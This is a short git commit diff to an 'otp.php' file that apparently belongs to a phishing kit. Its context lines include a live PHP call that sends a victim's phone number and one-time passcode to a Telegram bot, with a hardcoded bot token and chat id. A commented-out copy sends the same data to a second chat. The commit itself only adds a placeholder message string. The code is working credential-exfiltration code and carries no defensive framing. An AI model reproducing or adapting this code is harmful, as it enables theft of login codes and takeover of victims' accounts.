fc13d9bca80c56ea39daa708b13cc65a7efa7c51
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-11-11 20:59:32 +0700

    Update otp.php

--- otp.php
+++ otp.php
@@ -1,6 +1,7 @@
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_COOKIE['number'] . " OTP: " . $numotp);
 
 //$replyMsg = " Logged [ $ip ] \n OTP: $otp";
+$replyMsg = "   \n";
 
 // other
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-582319954&text=" . $_COOKIE['number'] . " OTP: " . $numotp);
